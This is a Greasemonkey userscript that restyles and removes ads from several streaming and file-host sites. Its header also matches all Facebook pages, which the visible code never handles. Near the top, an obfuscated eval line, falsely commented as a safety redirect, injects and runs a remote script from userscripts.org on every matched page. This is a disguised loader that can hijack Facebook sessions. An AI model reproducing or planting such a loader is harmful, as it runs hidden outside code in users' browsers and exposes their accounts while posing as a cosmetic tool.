// MegaReg
// Version 1.6
// Jan 20, 2012
// Copyright (c) 2011 USA, Lone Hood (TM)
// Released under the GPL license
// http://www.gnu.org/copyleft/gpl.html
//
// --------------------------------------------------------------------
//
// Changes in this version:
//
//
// GorrillaVid - dims background
//
// daClips - dims background
//
// uFLiQ - increases viewer size
//
// ShortForm - dims background
//
//
// --------------------------------------------------------------------
//
// This is a Greasemonkey user script.
//
// To install, you need Greasemonkey: 
// https://addons.mozilla.org/en-US/firefox/addon/748
//
// Then restart Firefox and revisit this script.
// Under Tools, there will be a new menu item to "Install User Script".
// Accept the default configuration and install.
//
// To uninstall, go to Tools/Manage User Scripts,
// select "MegaReg", and click Uninstall.
//
// --------------------------------------------------------------------
//
// ==UserScript==
// @name          MegaReg Plus
// @namespace     Lone Hood
// @description   Various enhancements for video sites
//
// @include       *1channel.*
// @include       *megaupload.com/*
// @include       *putlocker.com/*
// @include       *sockshare.com/*
// @include       *videoweed.es/*
// @include       *novamov.com/*
// @include       *movshare.net/*
// @include       *zshare.net/video*
// @include       *ufliq.com/*
// @include       *gorillavid.com/*
// @include       *shortform.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include       *letmewatchthis.*
// @include       *watchthisletme.com/*
//
// @require       http://sizzlemctwizzle.com/updater.php?id=109286
// @require       http://code.jquery.com/jquery-1.7.1.min.js
//
// ==/UserScript==


// Redirects old and fake links back to the main site to keep you safe
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



if (window.location.hostname.match("www\.1channel\.ch")) {
  $('div.warning_message:contains(Access our website)').remove();
  } else if (window.location.hostname.match("www\.letmewatchthis\.*|letmewatchthis\.*|www\.watchthisletme\.*|watchthisletme\.*|www\.1channel\.*|1channel\.*")) {
  window.location = ("http\://www\.1channel\.ch")
};


// LetMeWatchThis | 1channel
if (window.location.hostname.match("www\.1channel\.ch")) {

  // Remove error message
  $('div.error_message').remove();

  // Dim background
  $('html body').css('background-color','#444466');
  $('div.col1').css('background-color','#AAAABB');
  $('div#first.actual_tab table.movie_version').css('background-color','#DDDDFF');
  $('div.col2').css('background-color','#DDDDFF');

  $('div.movie_info table tbody tr td span.movie_info_actors a').css('color','#004499');
  $('div.index_item a').css('color','#000022');
  $('div.col1 h1.titles span').css('background-color','#444466');
  $('div.download_link').css('color','#555555');

  $('h1.titles').css('background','url(null)');
  $('h1.titles').css('background-color','#303050');
  $('div.main_body').css('background','url(null)');
  $('div.footer').css('background','url(null)');
  $('div.featured_movie_item a').css('background','#101030');

  // Make font more readable
  $('div.logged_links a').css('color','#882200');
  $('div.episode_prev_next a').css('color','#882200');
  $('span.help_link a').css('color','#882200');

  $('div.movie_info table tbody tr td:contains("Title")').next().wrap("<b></b>");

  // Users online
  $('div.users_online h3').css('color','#006600');
  $('div.users_online h3 span').css('color','#004400');
  $('div.users_online span.online_normal a').css('color','#0022CC');

  // Fix header
  $('html body').css('background-image','url(null)');
  $('#search_term.box').css('width','200px');
  $('div.nav_tabs').css('width','420px');
  $('div.header_search').css('width','250px');

  // Nudge censorship link over
  $('div.header a').css('right','225px');
  $('div.header a').css('top','2px');
  $('div.header a').css('height','15px');

  // Enlarge PutLocker link so it's easier to find
  $('span.version_host img[src="/images/host_48.gif"]').parent().parent().css('width','105');
  $('span.version_host img[src="/images/host_48.gif"]').css('width','105');
  $('span.version_host img[src="/images/host_48.gif"]').parent().parent().prev().css('font-size','16px');

  // Enlarge SockShare link so it's easier to find
  $('span.version_host img[src="/images/host_45.gif"]').parent().parent().css('width','105');
  $('span.version_host img[src="/images/host_45.gif"]').css('width','105');
  $('span.version_host img[src="/images/host_45.gif"]').parent().parent().prev().css('font-size','16px');

  // Enlarge NovaMov link so it's easier to find
  $('span.version_host:contains(novamov)').css('font-size','13px');
  $('span.version_host:contains(novamov)').parent().prev().css('font-size','16px');

  // Enlarge uFLiQ link so it's easier to find
  $('span.version_host:contains(ufliq)').css('font-size','13px');
  $('span.version_host:contains(ufliq)').parent().prev().css('font-size','16px');

  // Enlarge MovShare link so it's easier to find
  $('span.version_host:contains(movshare)').css('font-size','12px');
  $('span.version_host:contains(movshare)').parent().prev().css('font-size','15px');

  // Enlarge zShare link so it's easier to find - note to self: remove popup first.
  //$('span.version_host:contains(zshare)').css('font-size','12px');
  //$('span.version_host:contains(zshare)').parent().prev().css('font-size','15px');

  // Enlarge VideoWeed link so it's easier to find
  $('span.version_host:contains(videoweed)').css('font-size','12px');
  $('span.version_host:contains(videoweed)').parent().prev().css('font-size','15px');

  // Views are an important indicator of a good link
  $('span.report_broken').css('font-size','9px').parent().css('width','60');
  $('span.version_veiws').css('font-size','13px').css('color','black').parent().css('width','85');

  if (window.location.pathname.length>1){
    $('h1.titles:contains("Watch Featured Movies")').appendTo('div.col2').css('margin','12px 8px').css('padding','0');
    $('div.featured_movies').appendTo('div.col2').css('margin','0 20px 14px');
    $('.featured_movie_item').css('width','auto');
    $('.featured_movie_item').css('margin','6px');
    $('.featured_movie_item a').css('padding','8px 12px');

  // Replace with "Similar to" titles
  //  $('h1.titles:contains("Watch Featured Movies")').replaceWith($('h1.titles:contains("Similar to")'));
  //  $('div.featured_movies').replaceWith($('div.item_similar'));
  };

  // Fix page links
  $('div.pagination span').next().clone().text('Next >').insertBefore('div.pagination a:last').css('font-size','larger').css('font-weight','bold').css('color','#882200');
  $('div.pagination span').prev().clone().text('< Prev').insertAfter('div.pagination a:first').css('font-size','larger').css('font-weight','bold').css('color','#882200');

  // - I put Last and First back to normal because things
  // get skewed if the page numbers get up to the thousands.
  //
  // You can take out the double-slash // in the next two
  // lines of code if you prefer to keep the words intact.
  //
  //$('div.pagination a:last:contains( >> )').text('Last >>');
  //$('div.pagination a:first:contains( << )').text('<< First');

  // Add "Back to list" link
  $('div.stage_navigation h1.titles span a:first').clone().text('Back to List').insertBefore('div.episode_prev_next a:contains(Next)').after(' | ').css('color','#882200');

};


// MegaUpload
if (window.location.hostname.match("www\.megaupload\.com|megaupload\.com")) {

  // Increase filename font size
  $('div.down_top_bl1 div.down_txt_pad1 span.down_txt2').css('fontSize','20px');
  $('div.down_top_bl1 div.down_txt_pad2').css('padding-top','0px');

  // Remove feature frame
  $('div.down_table_pad').remove();

  // Remove premium button
  $('div.down_butt_bg div.down_butt_bg2').remove();

  // Center download button
  $('div.down_butt_bg').css('float','none');
  $('div.down_butt_bg').css('margin-left','auto');
  $('div.down_butt_bg').css('margin-right','auto');

  // Dim background
  $('body.color3').css('background-image','none');
  $('body').css('background-image','none');
  $('body.color3').css('background-color','rgba(41, 40, 56, 0.8)');
  $('div.rew_main_bg1').css('background-color','rgba(101, 100, 96, 0.8)');
  $('.download .black_r_bg1').css('background-image','none');
  $('.download .rew_main_bg1').css('background-image','none');

  // Remove popunder
  $('#downloadlink a').removeAttr('onclick');


  // Speed up download timer
  //$('div.down_butt_bg3 script').remove();
  //$('#downloadcounter').remove();
  //$('div#downloadlink.down_butt_pad1').css('display','');


};


// PutLocker
if (window.location.hostname.match("www\.putlocker\.com|putlocker\.com")) {

  // Dim background
  $('html body').css('background-color','#444444');
  $('div.container-back').css('background-color','#333333');
  $('div.item_confirm_page').css('background-color','#333333');
  $('div.item_confirm_page h3').css('background-color','#777777');

  // Remove ad
  $('div.ad_728x90_top').remove();

  // Remove table
  $('div.item_confirm_page table.choose_speed tbody tr:gt(0)').remove();
  $('div.item_confirm_page table.choose_speed tbody tr th:gt(1)').remove();
  $('div.item_confirm_page table.choose_speed tbody tr th:lt(1)').remove();

  // Lights off
  $('#buttonWrapper').css('width','200px');
  $('#lightsOff').css('font-size','18px');


};


// SockShare
if (window.location.hostname.match("www\.sockshare\.com|sockshare\.com")) {

  // Dim background
  $('html body').css('background-color','#444444');
  $('div.site-body').css('background-color','#222222');
  $('div.item_confirm_page table.choose_speed tbody tr th').css('background-color','#999999');
  $('div.item_confirm_page').css('background-color','#333333');
  $('div.item_confirm_page h3').css('background-color','#777777');

  // Remove ad
  $('div.ad_728x90_top').remove();

  // Remove table
  $('div.item_confirm_page table.choose_speed tbody tr:gt(0)').remove();
  $('div.item_confirm_page table.choose_speed tbody tr th:gt(1)').remove();
  $('div.item_confirm_page table.choose_speed tbody tr th:lt(1)').remove();

  // Lights off
  $('#buttonWrapper').css('width','200px');
  $('#lightsOff').css('font-size','18px');


};


// VideoWeed
if (window.location.hostname.match("www\.videoweed\.es")) {

  // Dim background
  $('html body').css('background','url(null)');
  $('html body').css('background-color','#112211');

  // Reduce top
  $('div#content').css('margin-top','5px');
  $('div#content div:first').remove();
  $('table#playerpageads_table').css('margin-top','10px');

  // Remove ads
  $('#playerpageads_table tbody tr td:gt(0)').remove();
  $('script').remove();
  $('noscript').remove();
  $('div#aad').remove();
  $('div#content style:eq(0)').remove();
  $('div#playerpage div:eq(0)').remove();
  $('a:contains(Premium)').remove();

};


// NovaMov
if (window.location.hostname.match("www\.novamov\.com")) {

  // Dim background
  $('html, body').css('background-color','#000000');
  $('div#content_block.clear').css('background-color','#003344');
  $('div#footer.clear').css('background','url(null)');
  $('div#v_tab1.v_tab.blockborder').css('background-color','#336677');

  $('div#menu').css('background','#112233');
  $('#menu ul li a:link').css('text-shadow','1px 1px #000000');
  $('div#logo a img,div.last a.video_tab').css('opacity','0.6');

  // Reduce top
  $('div#header').css('height','125px');
  $('div#logo').css('padding-top','7px');

  // Remove ads
  $('div.top_banner').remove();
  $('script').remove();
  $('noscript').remove();
  $('div#aad').remove();
  $('div.span-30').remove();
  $('body span embed').remove();
  $('a:contains(Premium)').remove();

  // Center vid
  $('.span-60').css('float','none');
  $('.span-60').css('width','auto');
  $('.span-58').css('float','none');
  $('.span-58').css('width','auto');
  $('div#v_tab1 h3').css('text-align','center');
  $('div#v_tab1 p').css('text-align','center');

};


// MovShare
if (window.location.hostname.match("www\.movshare\.net")) {

  // Dim box
  $('div#content_1.content').css('background-color','#446688');
  $('div.tabbed_area ul.tabs li a.active').css('background-color','#334455');


};


// zShare
if (window.location.hostname.match("www\.zshare\.net|zshare\.net")) {

  // Dim background
  $('div#main').css('background','none repeat scroll 0 0 #000000');
  $('html body').css('background','none repeat scroll 0 0 #333333');
  $('div#footer').css('background','none repeat scroll 0 0 #000000');

  // Remove ads
  $('div#main div:gt(0) div:lt(3)').remove();
  $('div#main div:gt(0) div:gt(0)').remove();
  $('div#footer div').remove();
  $('script').remove();

  // Remove popup


};


// uFLiQ
if (window.location.hostname.match("www\.ufliq\.com|ufliq\.com")) {

  // Remove extra space
  $('center table tbody tr:eq(1)').remove();
  $('center table tbody tr:eq(1) td:eq(1) div:eq(1)').remove();
  $('center table tbody tr:eq(1) td:eq(1) br:lt(6)').remove();
  $('center table tbody tr:eq(1) td:eq(1) br:eq(5)').remove();
  $('center table tbody tr:eq(1) td:eq(1) form div:lt(2)').remove();

  // Dim logo and code box
  $('center table tbody tr:eq(1) td:eq(0) div:eq(0) a img').css('opacity','0.4');
  $('center table tbody tr:eq(1) td:eq(0) div:eq(1) a').css('color','#656F66');
  $('textarea#embed_area').css('background','#656F66');

  // Remove ads
  $('center table tbody tr:eq(1) td:eq(1) table:eq(0):not(".video_table")').remove();
  $('center table tbody tr:eq(1) td:eq(1) table:eq(3)').remove();
  $('script').remove();
  $('noscript').remove();

  // Decrease left panel
  $('center table tbody tr:eq(1) td:eq(0)').css('width','80px');
  $('center table tbody tr:eq(1) td:eq(0) div:eq(0) a img').css('max-width','80px');
  $('center table tbody tr:eq(1) td:eq(0) div:eq(0)').css('padding-right','0px');
  $('center table tbody tr:eq(1) td:eq(0) div:eq(1)').css('padding-right','0px');
  $('center table tbody tr:eq(1) td:eq(0) div:eq(2)').remove();
  $('.left_menu_big').css('font-size','16px');

  // Increase viewer size
  $('center table tbody tr:eq(1) td:eq(1)').css('padding-left','5px');
  $('center table tbody tr:last td').css('width','900');
  $('table.video_table').css('width','900');
  $('embed#player').attr('width','900');
  $('embed#player').attr('height','542');

};


// GorillaVid
if (window.location.hostname.match("www\.gorillavid\.com|gorillavid\.com")) {

  // Dim header
  $('div#header-glow').css('background','-moz-linear-gradient(top, black 12%, #DB6200 82%, black 100%)');
  $('div#header-bg').css('background','-moz-linear-gradient(top, black 8%, #DB6200 58%, black 85%)');
  $('.btn').css('background','#222222');

  // Dim background
  $('div#h-bg-1 div.h-bg-in').css('background','black');
  $('.c1-box').css('background','black');
  $('div#h-bg-1').css('background','#222222');
  $('div#height-all').css('background','#222222');
  $('ul#menu-main').css('background','none');

  // Dim footer
  $('div#footer-glow').css('background','-moz-linear-gradient(top, black 5%, #DB6200 41%, black 90%)');

  // Remove Ads
  $('div.ads_3col').remove();
  $('script').remove();
     
};


// ShortForm
if (window.location.hostname.match("embed\.shortform\.com|www\.shortform\.com")) {

  // Dim left side
  $('.white-side-box').css('background-color','#222222');
  $('.button-v2').css('background','#111111');
  $('input#share-box-link-textfield').css('background','#666666');
  $('#bottom-bar').css('background-image','none');
  $('#bottom-bar').css('background','#111111');

  // Dim background
  $('div#home-container').css('background-color','black');
  $('.player').css('background-color','#111111');
  $('.carousel').css('background-color','#333333');
  $('div.lite-container').css('background-color','black');

};


